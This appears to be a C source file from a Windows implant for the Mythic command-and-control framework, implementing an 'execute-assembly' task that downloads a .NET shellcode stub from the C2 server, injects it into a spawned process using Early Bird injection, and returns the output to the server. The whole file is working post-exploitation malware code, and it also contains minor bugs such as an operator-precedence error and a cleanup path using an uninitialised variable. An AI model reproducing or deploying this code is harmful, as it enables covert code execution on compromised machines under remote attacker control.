#include "Tasks/ExecuteAssembly.h"


#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "Mythic.h"
#include "Inject.h"


/**
 * @brief Main command function for executing a .NET assembly file.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given tasks data buffer
 * 
 * @return VOID
 */
VOID ExecuteAssembly(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
/*
    1. Parse arguments
    2. Fetch Assembly shellcode file
    3. Spawn and inject the shellcode stub
    4. Get & Send the output
*/
    /* Parse BOF arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    DWORD  Status;
    SIZE_T uuidLen              = 0;
    DWORD  filesize             = 0;
    MYTHIC_FILE AssemblyStub    = { 0 };

    PCHAR  fileUuid  = ParserGetString(arguments, &uuidLen);

    strncpy(AssemblyStub.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
    AssemblyStub.fileUuid[TASK_UUID_SIZE + 1] = '\0';

    _dbg("FOUND FILE UUID %s", AssemblyStub.fileUuid);

    /* Fetch file from Mythic using File UUID */
    if (Status = MythicGetFileBytes(taskUuid, &AssemblyStub) != 0)
    {
        _err("Failed to fetch file from Mythic server.");
        PackageError(taskUuid, Status);
        return;
    }

    unsigned char* assemblyOutput = NULL;

    /* Spawn and Inject the Assembly Stub into a Process */
    if (!InjectProcessViaEarlyBird((PBYTE)AssemblyStub.buffer, AssemblyStub.size, &assemblyOutput))
	{
        DWORD error = GetLastError();
		_err("[!] Failed to inject process with assembly shellcode. ERROR : %d\n", error);
        PackageError(taskUuid, error);
        goto END;
	}
    
    PPackage data = PackageInit(0, FALSE);
    PackageAddString(data, assemblyOutput, FALSE);
    
    // Success
    PackageComplete(taskUuid, data);

END:
    // Cleanup
	if (assemblyOutput) free(assemblyOutput);
    LocalFree(AssemblyStub.buffer);          // allocated in MythicGetFileBytes()
    AssemblyStub.buffer = NULL;
    if (data) PackageDestroy(data);
}


/**
 * @brief Thread entrypoint for ExecuteAssembly function. 
 * 
 * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
 * 
 * @return DWORD WINAPI
 */
DWORD WINAPI ExecuteAssemblyThread(_In_ LPVOID lpTaskParamter)
{
    _dbg("Thread started.");

    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;

    ExecuteAssembly(tp->TaskUuid, tp->TaskParser);
    
    _dbg("ExecuteAssembly Thread cleaning up now...");
    // Cleanup things used for thread
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);  
    return 0;
}


#endif  //INCLUDE_CMD_EXECUTE_ASSEMBLY